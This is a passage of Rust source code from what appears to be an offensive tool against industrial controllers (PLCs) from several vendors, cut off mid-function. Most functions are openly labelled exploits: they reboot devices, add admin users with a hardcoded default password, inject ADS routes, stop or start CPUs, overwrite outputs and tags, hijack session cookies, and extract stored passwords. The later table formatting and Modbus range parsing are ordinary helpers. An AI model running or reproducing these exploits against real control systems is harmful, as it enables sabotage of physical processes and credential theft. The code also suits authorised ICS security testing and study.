        Some(dev) => match scan::set_twincat_state(&dev, &local_netid, state, port) {
            Ok(_) => out(&format!("[+] State command sent ({state})")),
            Err(e) => out(&format!("[-] {e}")),
        },
        None => out("[-] No Beckhoff device responded"),
    }
}

fn exploit_beckhoff_reboot(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::webcontrol;
    out(&format!("[*] Sending reboot to {ip}..."));
    match webcontrol::reboot(ip, port) {
        Ok(true) => out("[+] Reboot command sent"),
        Ok(false) => out("[!] Sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_beckhoff_adduser(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::webcontrol;
    let (uname, pass) = input.split_once(':').unwrap_or((input, "Sc4d4v3r!"));
    out(&format!("[*] Adding user '{uname}' to {ip}..."));
    match webcontrol::add_user(ip, port, uname, pass) {
        Ok(true) => out("[+] User creation command sent"),
        Ok(false) => out("[!] Sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_siemens_cpu(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
    use crate::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    out(&format!("[*] Reading CPU state from {ip}:{port}..."));
    let state = s7comm::get_cpu_state(ip, port, 5, None);
    if state == "Unknown" {
        if s7comm::probe_auth_required(ip, port, 5) {
            out("[-] Access denied — retry via CLI with --password");
        } else {
            out("[-] Could not read CPU state");
        }
    } else {
        out(&format!("  CPU State: {state}"));
    }
}

fn exploit_siemens_io(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
    use crate::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    out(&format!("[*] Reading I/O from {ip}:{port}..."));
    let data = s7comm::read_all_data(ip, port, 5, None);
    let [hdr, sep] = io_header();
    let mut all_addrs: Vec<String> = Vec::new();
    let mut all_vals: Vec<String> = Vec::new();
    let mut has_any = false;

    for (area, prefix) in &[("inputs", "I"), ("outputs", "Q"), ("merkers", "M")] {
        let Some(Some(bits)) = data.get(*area) else {
            continue;
        };
        let mut keys: Vec<&String> = bits.keys().collect();
        keys.sort_by(|a, b| {
            let parse = |s: &str| {
                let (byte_s, bit_s) = s.split_once('.').unwrap_or((s, "0"));
                (
                    byte_s.parse::<u32>().unwrap_or(0),
                    bit_s.parse::<u8>().unwrap_or(0),
                )
            };
            parse(a).cmp(&parse(b))
        });
        out(&format!("  [{area}]"));
        out(&hdr);
        out(&sep);
        for key in &keys {
            let val = bits[*key];
            let (byte_s, bit_s) = key.split_once('.').unwrap_or((key, "0"));
            let addr = format!("{prefix}{byte_s}.{bit_s}");
            out(&fmt_io_row(&addr, bit_s, val));
            all_addrs.push(addr);
            all_vals.push(if val != 0 {
                "true".to_string()
            } else {
                "false".to_string()
            });
        }
        out(&sep);
        has_any = true;
    }

    if !has_any {
        if s7comm::probe_auth_required(ip, port, 5) {
            out("[-] Access denied — retry via CLI with --password");
        } else {
            out("[-] No I/O data received");
        }
        return;
    }
    let points: Vec<(&str, Option<&str>, &str)> = all_addrs
        .iter()
        .zip(all_vals.iter())
        .map(|(a, v)| (a.as_str(), Some("BOOL"), v.as_str()))
        .collect();
    save_and_diff(ip, "s7", &points, out);
}

fn exploit_siemens_toggle(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
    use crate::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    out(&format!("[*] Toggling CPU state on {ip}:{port}..."));
    if s7comm::change_cpu_state(ip, port, 5) {
        out(&format!(
            "[+] New state: {}",
            s7comm::get_cpu_state(ip, port, 5, None)
        ));
    } else if s7comm::probe_auth_required(ip, port, 5) {
        out("[-] Access denied — retry via CLI with --password");
    } else {
        out("[-] Failed to toggle CPU state");
    }
}

fn exploit_schneider_flash(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::flash_led;
    out(&format!("[*] Flashing LED on {ip}..."));
    match flash_led::flash_led_ip(ip) {
        Ok(()) => out("[+] Flash LED command sent"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_schneider_hijack_info(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::schneider::session_hijack;
    out(&format!("[*] Getting session cookie from {ip}..."));
    match session_hijack::get_session_cookie(ip, port) {
        Some(s) => {
            out(&format!("[+] Cookie:          {}", s.cookie_value));
            out(&format!("    Power-on count:  {}", s.power_on_count));
            session_hijack::get_device_info(ip, port, &s.cookie_value, "Administrator");
        }
        None => out("[-] Failed to get session cookie"),
    }
}

fn exploit_schneider_action(ip: &str, port: u16, action: &str, out: &impl Fn(&str)) {
    use crate::vendors::schneider::session_hijack;
    out(&format!("[*] Getting session cookie from {ip}..."));
    match session_hijack::get_session_cookie(ip, port) {
        Some(s) => {
            out(&format!("[+] Cookie: {}", s.cookie_value));
            if session_hijack::control_plc(ip, port, &s.cookie_value, "Administrator", action) {
                out(&format!("[+] PLC {action} command sent"));
            } else {
                out(&format!("[-] Failed to {action} PLC"));
            }
        }
        None => out("[-] Failed to get session cookie"),
    }
}

fn exploit_phoenix_passwords(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::webvisit;
    out(&format!("[*] Retrieving passwords from {ip}..."));
    match webvisit::retrieve_passwords(ip, port) {
        Ok(entries) => {
            for e in &entries {
                if let Some(p) = &e.password {
                    out(&format!("  Level {}: {p}", e.user_level));
                } else if let Some(h) = &e.hash {
                    out(&format!("  Level {} [sha256]: {h}", e.user_level));
                }
            }
            out(&format!("[+] {} entry/entries found", entries.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_phoenix_list_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::webvisit;
    out(&format!("[*] Listing tags on {ip}..."));
    match webvisit::get_tags(ip, port) {
        Ok((project, tags)) => {
            out(&format!("  Project: {project}"));
            for (i, t) in tags.iter().enumerate() {
                out(&format!("  [{i:>4}] {t}"));
            }
            out(&format!("[+] {} tag(s)", tags.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_phoenix_read_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::webvisit;
    out(&format!("[*] Reading tag values from {ip}..."));
    let tags_result = webvisit::get_tags(ip, port);
    match tags_result {
        Ok((_, tags)) => match webvisit::read_tag_values(ip, port, &tags) {
            Ok(vals) => {
                for (name, val) in &vals {
                    out(&format!("  {name}: {val}"));
                }
            }
            Err(e) => out(&format!("[-] {e}")),
        },
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_phoenix_write_tag(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::webvisit;
    let (tag_name, value) = input.split_once('=').unwrap_or((input, "0"));
    out(&format!("[*] Writing {tag_name}={value} on {ip}..."));
    match webvisit::write_tag_value(ip, port, tag_name, value) {
        Ok(_) => out(&format!("[+] Wrote {tag_name} = {value}")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_phoenix_info(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::phoenix::control;
    out(&format!("[*] Getting device info from {ip}..."));
    match control::get_device_info(ip, port, false) {
        Ok(info) => {
            out(&format!("  PLC Type: {}", info.plc_type));
            if let Some(fw) = info.firmware {
                out(&format!("  Firmware: {fw}"));
            }
            if let Some(b) = info.build {
                out(&format!("  Build:    {b}"));
            }
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_ewon_creds(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::ewon::exploit;
    let (username, max_str) = if input.is_empty() {
        ("adm", "20")
    } else {
        input.split_once(':').unwrap_or(("adm", "20"))
    };
    let max_users: u32 = max_str.trim().parse().unwrap_or(20);
    out(&format!(
        "[*] Extracting credentials from {ip} (user={username}, slots={max_users})..."
    ));
    let users = exploit::exploit(ip, port, username, max_users);
    for u in &users {
        out(&format!(
            "  {} ({} {}): {}",
            u.username, u.first_name, u.last_name, u.password
        ));
        if !u.access_rights.is_empty() {
            out(&format!("    Access: {}", u.access_rights));
        }
    }
    out(&format!("[+] {} user(s) extracted", users.len()));
}

fn exploit_rockwell_identity(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::rockwell::driver;
    out(&format!("[*] Getting device identity from {ip}..."));
    match driver::get_device_info(ip, port) {
        Ok(dev) => {
            out(&format!("  Vendor:       {}", dev.vendor));
            out(&format!("  Product Type: {}", dev.product_type));
            out(&format!("  Product Code: {}", dev.product_code));
            out(&format!("  Product Name: {}", dev.product_name));
            out(&format!("  Revision:     {}", dev.revision));
            out(&format!("  Serial:       {}", dev.serial));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_rockwell_tags(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::rockwell::driver;
    use std::collections::HashMap;

    out(&format!("[*] Enumerating tags on {ip}..."));
    let tags = match driver::enumerate_tags(ip, port) {
        Ok(t) => t,
        Err(e) => {
            out(&format!("[-] {e}"));
            return;
        }
    };
    out(&format!(
        "[*] {} tags found — reading scalar values...",
        tags.len()
    ));

    // Bulk-read all scalar (non-array, non-struct) tags in one session
    let scalar_names: Vec<&str> = tags
        .iter()
        .filter(|t| t.tag_type & 0x8000 == 0 && t.dimensions == 0)
        .map(|t| t.name.as_str())
        .collect();
    let raw_values = driver::read_tags_bulk(ip, port, &scalar_names);
    let value_map: HashMap<&str, String> = scalar_names
        .iter()
        .zip(raw_values.iter())
        .map(|(&name, opt)| {
            let val = match opt {
                Some(data) => driver::decode_value(
                    tags.iter()
                        .find(|t| t.name == name)
                        .map_or(0, |t| t.tag_type),
                    data,
                ),
                None => "-".to_string(),
            };
            (name, val)
        })
        .collect();

    let [hdr, sep] = tag_header();
    out(&hdr);
    out(&sep);
    for t in &tags {
        let (base, dims) = driver::type_parts(t.tag_type);
        let value = if t.tag_type & 0x8000 != 0 {
            "[struct]".to_string()
        } else if t.dimensions > 0 {
            "[array]".to_string()
        } else {
            value_map
                .get(t.name.as_str())
                .cloned()
                .unwrap_or_else(|| "-".to_string())
        };
        out(&fmt_tag_row(
            i64::from(t.instance_id),
            &t.name,
            &base,
            dims,
            &value,
            i64::from(t.tag_type),
        ));
    }
    out(&sep);
    out(&format!("[+] {} tag(s)", tags.len()));
    save_tags_and_diff(ip, &tags, out);
}

fn save_tags_and_diff(
    ip: &str,
    tags: &[crate::vendors::rockwell::driver::LogixTag],
    out: &impl Fn(&str),
) {
    use crate::db::Database;
    use crate::vendors::rockwell::driver;
    match Database::open(&Database::default_path()) {
        Ok(db) => {
            let data: Vec<(i64, &str, i64)> = tags
                .iter()
                .map(|t| (i64::from(t.instance_id), t.name.as_str(), i64::from(t.tag_type)))
                .collect();
            match db.upsert_tags(ip, &data) {
                Ok(diff) if diff.is_empty() => {
                    out("[*] Tags saved — no changes since last scan");
                }
                Ok(diff) => {
                    out(&format!(
                        "[!] Tag changes: +{} added  -{} removed  ~{} type-changed",
                        diff.added.len(),
                        diff.removed.len(),
                        diff.type_changed.len(),
                    ));
                    for t in &diff.added {
                        out(&format!(
                            "  [+NEW] {:<40} : {}",
                            t.name,
                            driver::type_name(u16::try_from(t.tag_type).unwrap_or(u16::MAX))
                        ));
                    }
                    for t in &diff.removed {
                        out(&format!(
                            "  [-DEL] {:<40} : {}",
                            t.name,
                            driver::type_name(u16::try_from(t.tag_type).unwrap_or(u16::MAX))
                        ));
                    }
                    for c in &diff.type_changed {
                        out(&format!(
                            "  [~CHG] {:<40} : {} \u{2192} {}",
                            c.name,
                            driver::type_name(u16::try_from(c.old_type).unwrap_or(u16::MAX)),
                            driver::type_name(u16::try_from(c.new_type).unwrap_or(u16::MAX)),
                        ));
                    }
                }
                Err(e) => out(&format!("[!] Tag save failed: {e}")),
            }
        }
        Err(e) => out(&format!("[!] Cannot open DB to save tags: {e}")),
    }
}

fn exploit_rockwell_monitor(ip: &str, port: u16, out: &impl Fn(&str), stop: &Arc<AtomicBool>) {
    use crate::vendors::rockwell::driver;
    use chrono::Local;

    out(&format!("[*] Tag monitor started for {ip}"));
    out("[*] Fetching baseline tags...");

    // Initial baseline scan
    match driver::enumerate_tags(ip, port) {
        Ok(tags) => {
            out(&format!("[+] Baseline: {} tags", tags.len()));
            save_tags_and_diff(ip, &tags, out);
        }
        Err(e) => {
            out(&format!("[-] Baseline fetch failed: {e}"));
            return;
        }
    }

    out("[*] Polling every 30 s — fire another exploit or close zoom to stop");

    for poll in 1u32.. {
        // Sleep 30 s in 1-second ticks so the stop flag is checked promptly
        for _ in 0..30 {
            if stop.load(Ordering::Relaxed) {
                out("[*] Monitor stopped");
                return;
            }
            std::thread::sleep(Duration::from_secs(1));
        }
        if stop.load(Ordering::Relaxed) {
            out("[*] Monitor stopped");
            return;
        }

        let ts = Local::now().format("%H:%M:%S").to_string();
        out(&format!("[*] Poll #{poll} at {ts}"));

        match driver::enumerate_tags(ip, port) {
            Ok(tags) => save_tags_and_diff(ip, &tags, out),
            Err(e) => out(&format!("[-] Poll failed: {e}")),
        }
    }
}

fn exploit_rockwell_read(ip: &str, port: u16, tag: &str, out: &impl Fn(&str)) {
    use crate::vendors::rockwell::driver;
    out(&format!("[*] Reading tag '{tag}' from {ip}..."));
    match driver::read_tag(ip, port, tag) {
        Ok(raw) => out(&format!("  {tag} = 0x{}", hex_fmt(&raw))),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_rockwell_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::rockwell::driver;
    let (tag_name, hex_val) = input.split_once('=').unwrap_or((input, "00"));
    let value_bytes: Vec<u8> = hex_val
        .as_bytes()
        .chunks(2)
        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
        .collect();
    let type_code: u16 = if value_bytes.len() == 1 {
        0x00C1
    } else {
        0x00C4
    };
    match driver::write_tag(ip, port, tag_name, type_code, &value_bytes) {
        Ok(()) => out(&format!("[+] {tag_name}: written")),
        Err(e) => out(&format!("[-] {tag_name}: {e}")),
    }
}

fn exploit_mitsubishi_info(ip: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::scan;
    out(&format!("[*] Getting Mitsubishi device info from {ip}..."));
    match scan::scan_ip(ip, 3, true) {
        Ok(devs) => {
            if devs.is_empty() {
                out("[-] No Mitsubishi device responded");
            }
            for d in &devs {
                out(&format!("  PLC Type: {}", d.plc_type));
                if let Some(title) = &d.title {
                    out(&format!("  Title:    {title}"));
                }
                if let Some(comment) = &d.comment {
                    out(&format!("  Comment:  {comment}"));
                }
            }
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_mitsubishi_state(ip: &str, state: &str, out: &impl Fn(&str)) {
    use crate::vendors::mitsubishi::control;
    let iface = NetworkInterface {
        name: "auto".into(),
        ip: local_ip_for(ip),
        netmask: "255.255.255.0".into(),
    };
    out(&format!("[*] Setting Mitsubishi to {state}..."));
    match control::set_state_ip(&iface, ip, state) {
        Ok(true) => out(&format!("[+] State set to {state}")),
        Ok(false) => out("[!] Command sent — no confirmation"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Column headers ──────────────────────────────────────────────────────────

fn io_header() -> [String; 2] {
    [
        format!(
            "  {:<10}  {:<4}  {:<5}  {}",
            "Address", "Bit", "Value", "Raw"
        ),
        format!("  {:─<10}  {:─<4}  {:─<5}  {:─<3}", "", "", "", ""),
    ]
}

fn fmt_io_row(addr: &str, bit: &str, val: u8) -> String {
    let value_str = if val != 0 { "true " } else { "false" };
    format!("  {addr:<10}  {bit:<4}  {value_str:<5}  {val}")
}

fn modbus_header() -> [String; 2] {
    [
        format!(
            "  {:<10}  {:<8}  {:<10}  {}",
            "Address", "Number", "Value", "Hex"
        ),
        format!("  {:─<10}  {:─<8}  {:─<10}  {:─<6}", "", "", "", ""),
    ]
}

fn fmt_modbus_row(r: &crate::vendors::schneider::modbus::ModbusRegister) -> String {
    format!(
        "  {:<10}  {:<8}  {:<10}  {:#06x}",
        r.address, r.display_addr, r.raw, r.raw
    )
}

fn slmp_header() -> [String; 2] {
    [
        format!("  {:<12}  {:<10}  {}", "Device", "Address", "Value"),
        format!("  {:─<12}  {:─<10}  {:─<8}", "", "", ""),
    ]
}

fn fmt_slmp_row(v: &crate::vendors::mitsubishi::slmp::SlmpValue) -> String {
    format!("  {:<12}  {:<10}  {}", v.display, v.raw, v.value_str)
}

fn ads_symbol_header() -> [String; 2] {
    [
        format!(
            "  {:<48}  {:<14}  {:<20}  {}",
            "Name", "Type", "Value", "Size"
        ),
        format!("  {:─<48}  {:─<14}  {:─<20}  {:─<8}", "", "", "", ""),
    ]
}

fn fmt_ads_symbol_row(name: &str, type_name: &str, value: &str, size: u32) -> String {
    format!("  {name:<48}  {type_name:<14}  {value:<20}  {size} B")
}

// ─── DB save + diff helpers ──────────────────────────────────────────────────

fn save_and_diff(
    ip: &str,
    protocol: &str,
    points: &[(&str, Option<&str>, &str)],
    out: &impl Fn(&str),
) {
    use crate::db::Database;
    let db = match Database::open(&Database::default_path()) {
        Ok(d) => d,
        Err(e) => {
            out(&format!("[!] Cannot open DB: {e}"));
            return;
        }
    };
    match db.upsert_data_points(ip, protocol, points) {
        Ok(diff) if diff.is_empty() => out("[*] Saved — no changes since last scan"),
        Ok(diff) => {
            out(&format!(
                "[!] Changes: +{} added  -{} removed  ~{} value-changed",
                diff.added.len(),
                diff.removed.len(),
                diff.value_changed.len(),
            ));
            for c in &diff.value_changed {
                let old = c.old_value.as_deref().unwrap_or("-");
                out(&format!(
                    "  [~CHG] {:<36} : {} \u{2192} {}",
                    c.address, old, c.new_value
                ));
            }
        }
        Err(e) => out(&format!("[!] DB save failed: {e}")),
    }
}

// ─── New Beckhoff exploits ───────────────────────────────────────────────────

fn exploit_beckhoff_get_state(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    out(&format!("[*] Reading TwinCAT runtime state from {ip}..."));
    match scan::discover_ip_with_port(ip, 3, true, port)
        .ok()
        .and_then(|mut v| {
            if v.is_empty() {
                None
            } else {
                Some(v.remove(0))
            }
        }) {
        Some(dev) => out(&format!(
            "[+] State: {}",
            scan::get_state(&dev, &local_netid, port)
        )),
        None => out("[-] No Beckhoff device responded"),
    }
}

fn exploit_beckhoff_add_route(ip: &str, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_ip = local_ip_for(ip);
    let local_netid = ads::build_local_netid(&local_ip);
    let (username, password) = input.split_once(':').unwrap_or((input, "1"));
    out(&format!(
        "[*] Injecting ADS route on {ip} for user '{username}'..."
    ));
    match scan::discover_ip(ip, 3, true).ok().and_then(|mut v| {
        if v.is_empty() {
            None
        } else {
            Some(v.remove(0))
        }
    }) {
        Some(dev) => {
            if scan::add_route(
                &dev,
                &local_ip,
                &local_netid,
                username,
                password,
                Some("scadaver"),
            ) {
                out("[+] Route added — this host now has ADS access to the PLC");
            } else {
                out("[-] Route injection failed (wrong credentials or device denied)");
            }
        }
        None => out("[-] No Beckhoff device responded"),
    }
}

fn exploit_beckhoff_symbols(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    out(&format!("[*] Enumerating ADS symbols on {ip}..."));
    let Some(dev) = scan::discover_ip_with_port(ip, 3, true, port)
        .ok()
        .and_then(|mut v| {
            if v.is_empty() {
                None
            } else {
                Some(v.remove(0))
            }
        })
    else {
        out("[-] No Beckhoff device responded");
        return;
    };
    let symbols = scan::enumerate_symbols(&dev, &local_netid, port);
    if symbols.is_empty() {
        out("[-] No symbols returned (device may not support ADS symbol upload)");
        return;
    }
    let [hdr, sep] = ads_symbol_header();
    out(&hdr);
    out(&sep);
    for s in &symbols {
        let value = s.value_str.as_deref().unwrap_or("-");
        out(&fmt_ads_symbol_row(&s.name, &s.type_name, value, s.size));
    }
    out(&sep);
    out(&format!("[+] {} symbol(s)", symbols.len()));
    let points: Vec<(&str, Option<&str>, &str)> = symbols
        .iter()
        .filter(|s| s.value_str.is_some())
        .map(|s| {
            (
                s.name.as_str(),
                Some(s.type_name.as_str()),
                s.value_str.as_deref().unwrap(),
            )
        })
        .collect();
    save_and_diff(ip, "ads", &points, out);
}

// ─── New Siemens exploits ────────────────────────────────────────────────────

fn exploit_siemens_set_outputs(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    let args = input.trim();
    out(&format!("[*] Writing outputs '{args}' to {ip}:{port}..."));
    if s7comm::set_outputs(ip, args, port, 5, None) {
        out("[+] Outputs written");
    } else if s7comm::probe_auth_required(ip, port, 5) {
        out("[-] Access denied — retry via CLI with --password");
    } else {
        out("[-] Write failed");
    }
}

fn exploit_siemens_set_merkers(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    let args = input.trim();
    let (bits, offset_s) = args.split_once(':').unwrap_or((args, "0"));
    let offset = offset_s.trim().parse::<u32>().unwrap_or(0);
    out(&format!(
        "[*] Writing merkers '{bits}' at offset {offset} to {ip}:{port}..."
    ));
    if s7comm::set_merkers(ip, bits, offset, port, 5, None) {
        out("[+] Merkers written");
    } else if s7comm::probe_auth_required(ip, port, 5) {
        out("[-] Access denied — retry via CLI with --password");
    } else {
        out("[-] Write failed");
    }
}

fn exploit_siemens_list_dbs(ip: &str, port: u16, _input: &str, out: &impl Fn(&str)) {
    use crate::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    out(&format!(
        "[*] Scanning DB1..200 on {ip}:{port} (may take a moment)..."
    ));
    let blocks = s7comm::list_data_blocks(ip, port, 5, None);
    if blocks.is_empty() {
        if s7comm::probe_auth_required(ip, port, 5) {
            out("[-] Access denied — retry via CLI with --password");
        } else {
            out("[-] No readable data blocks found");
        }
        return;
    }
    out(&format!("  {:<8}  {}", "Block", "Bytes read"));
    out(&format!("  {:─<8}  {:─<10}", "", ""));
    for (db_num, size) in &blocks {
        out(&format!("  {:<8}  {size}", format!("DB{db_num}")));
    }
    out(&format!("[+] {} data block(s) found", blocks.len()));
}

fn exploit_siemens_read_db(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    let parts: Vec<&str> = input.trim().splitn(3, ':').collect();
    let db_str = parts.first().copied().unwrap_or("DB1");
    let db_num = db_str
        .trim_start_matches(|c: char| c.is_alphabetic())
        .parse::<u16>()
        .unwrap_or(1);
    let offset = parts
        .get(1)
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(0);
    let length = parts
        .get(2)
        .and_then(|s| s.parse::<u16>().ok())
        .unwrap_or(64)
        .min(240);
    out(&format!(
        "[*] Reading DB{db_num} offset={offset} len={length} from {ip}:{port}..."
    ));
    match s7comm::read_data_block(ip, db_num, offset, length, port, 5, None) {
        Ok(data) => {
            for line in hex_dump_lines(&data, offset) {
                out(&line);
            }
            out(&format!("[+] {} bytes", data.len()));
        }
        Err(e) => {
            if s7comm::probe_auth_required(ip, port, 5) {
                out("[-] Access denied — retry via CLI with --password");
            } else {
                out(&format!("[-] {e}"));
            }
        }
    }
}

fn hex_dump_lines(data: &[u8], base_offset: u16) -> Vec<String> {
    data.chunks(16)
        .enumerate()
        .map(|(i, chunk)| {
            let offset = base_offset as usize + i * 16;
            let hex: String = {
                use std::fmt::Write;
                chunk.iter().fold(String::new(), |mut s, b| {
                    let _ = write!(s, "{b:02x} ");
                    s
                })
            };
            let ascii: String = chunk
                .iter()
                .map(|&b| if b.is_ascii_graphic() { b as char } else { '.' })
                .collect();
            format!("  {offset:04x}  {hex:<48}  {ascii}")
        })
        .collect()
}

// ─── New Schneider/Modbus exploits ───────────────────────────────────────────

const MODBUS_ADDRESS_SPACE: u32 = 65_536;
const MODBUS_WORD_CHUNK: u16 = 125;
const MODBUS_BIT_CHUNK: u16 = 2000;
const MODBUS_MAP_VALUE_OUTPUT_CAP: usize = 64;
const MODBUS_MAP_ERROR_OUTPUT_CAP: usize = 20;
const SLMP_ADDRESS_SPACE: u32 = 16_777_216;
const SLMP_WORD_CHUNK: u16 = 960;
const SLMP_BIT_CHUNK: u16 = 3584;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ModbusTable {
    Holding,
    Input,
    Coil,
    Discrete,
}

impl ModbusTable {
    fn parse(input: &str) -> Option<Self> {
        match input.trim().to_ascii_lowercase().as_str() {
            "hr" | "holding" | "holding-register" | "holding-registers" | "hreg" | "hregs"
            | "register" | "registers" => Some(Self::Holding),
            "ir" | "input" | "input-register" | "input-registers" | "ireg" | "iregs" => {
                Some(Self::Input)
            }
            "co" | "coil" | "coils" => Some(Self::Coil),
            "di" | "discrete" | "discrete-input" | "discrete-inputs" | "input-bit"
            | "input-bits" => Some(Self::Discrete),
            _ => None,
        }
    }

    fn short_name(self) -> &'static str {
        match self {
            Self::Holding => "HR",
            Self::Input => "IR",
            Self::Coil => "CO",
            Self::Discrete => "DI",
        }
    }

    fn label(self) -> &'static str {
        match self {
            Self::Holding => "holding registers",
            Self::Input => "input registers",
            Self::Coil => "coils",
            Self::Discrete => "discrete inputs",
        }
    }

    fn point_type(self) -> &'static str {
        match self {
            Self::Holding | Self::Input => "UINT16",
            Self::Coil | Self::Discrete => "BOOL",
        }
    }

    fn chunk_limit(self) -> u16 {
        match self {
            Self::Holding | Self::Input => MODBUS_WORD_CHUNK,
            Self::Coil | Self::Discrete => MODBUS_BIT_CHUNK,
        }
    }

    fn display_addr(self, address: u32) -> u32 {
        let offset = match self {
            Self::Holding => 40001,
            Self::Input => 30001,
            Self::Coil => 1,
            Self::Discrete => 10001,
        };
        address + offset
    }

    fn point_key(self, address: u32) -> String {
        format!("{}{}", self.short_name(), self.display_addr(address))
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct ModbusMapRange {
    table: ModbusTable,
    start: u32,
    count: u32,
}

impl ModbusMapRange {
    fn new(table: ModbusTable, start: u32, count: u32) -> Self {
        Self {
            table,
            start,
            count,
        }
    }

    fn display_start(self) -> u32 {
        self.table.display_addr(self.start)
    }

    fn display_end(self) -> u32 {
        self.table.display_addr(self.start + self.count - 1)
    }
}

fn quick_modbus_ranges() -> Vec<ModbusMapRange> {
    vec![
        ModbusMapRange::new(ModbusTable::Holding, 0, 32),
        ModbusMapRange::new(ModbusTable::Input, 0, 32),
        ModbusMapRange::new(ModbusTable::Coil, 0, 64),
        ModbusMapRange::new(ModbusTable::Discrete, 0, 64),
    ]
}

fn common_modbus_ranges() -> Vec<ModbusMapRange> {
    vec![
        ModbusMapRange::new(ModbusTable::Holding, 0, 1000),
        ModbusMapRange::new(ModbusTable::Input, 0, 1000),
        ModbusMapRange::new(ModbusTable::Coil, 0, 2000),
        ModbusMapRange::new(ModbusTable::Discrete, 0, 2000),
    ]
}

fn all_modbus_ranges() -> Vec<ModbusMapRange> {
    vec![
        ModbusMapRange::new(ModbusTable::Holding, 0, MODBUS_ADDRESS_SPACE),
        ModbusMapRange::new(ModbusTable::Input, 0, MODBUS_ADDRESS_SPACE),
        ModbusMapRange::new(ModbusTable::Coil, 0, MODBUS_ADDRESS_SPACE),
        ModbusMapRange::new(ModbusTable::Discrete, 0, MODBUS_ADDRESS_SPACE),
    ]
}

fn parse_modbus_map_input(input: &str) -> std::result::Result<Vec<ModbusMapRange>, String> {
    let spec = input.trim();
    if spec.is_empty() || spec.eq_ignore_ascii_case("quick") {
        return Ok(quick_modbus_ranges());
    }
    if spec.eq_ignore_ascii_case("common") {
        return Ok(common_modbus_ranges());
    }
    if spec.eq_ignore_ascii_case("all") {
        return Ok(all_modbus_ranges());
    }

    let mut ranges = Vec::new();
    for token in spec.split(',') {
        let token = token.trim();
        if token.is_empty() {
            return Err(format_modbus_map_usage());
        }
        let parts: Vec<_> = token.split(':').map(str::trim).collect();
        if parts.len() != 3 {
            return Err(format_modbus_map_usage());
        }
        let table = ModbusTable::parse(parts[0]).ok_or_else(|| {
            format!(
                "unknown Modbus table '{}'. {}",
                parts[0],
                format_modbus_map_usage()
            )
        })?;
        let start = parts[1].parse::<u32>().map_err(|_| {
            format!(
                "invalid start address '{}'. {}",
                parts[1],
                format_modbus_map_usage()
            )
        })?;
        let count = parts[2].parse::<u32>().map_err(|_| {
            format!(
                "invalid count '{}'. {}",
                parts[2],
                format_modbus_map_usage()
            )
        })?;
        if start >= MODBUS_ADDRESS_SPACE {
            return Err(format!(
                "start address {start} is outside 0..65535. {}",
                format_modbus_map_usage()
            ));
        }
        if count == 0 || count > MODBUS_ADDRESS_SPACE - start {
            return Err(format!(
                "count {count} at start {start} is outside the Modbus address space. {}",
                format_modbus_map_usage()
            ));
        }
        ranges.push(ModbusMapRange::new(table, start, count));
    }

    if ranges.is_empty() {
        Err(format_modbus_map_usage())
    } else {
        Ok(ranges)
    }
}

fn format_modbus_map_usage() -> String {
    "use quick, common, all, or table:start:count entries like hr:0:500,ir:0:100,co:0:128,di:0:128"
        .to_string()
}

fn modbus_map_chunks(range: ModbusMapRange) -> Vec<(u16, u16)> {
    let mut chunks = Vec::new();
    let mut start = range.start;
    let mut remaining = range.count;
    let max_count = u32::from(range.table.chunk_limit());
    while remaining > 0 {
        let count = remaining.min(max_count);
        chunks.push((u16::try_from(start).unwrap_or(u16::MAX), u16::try_from(count).unwrap_or(u16::MAX)));
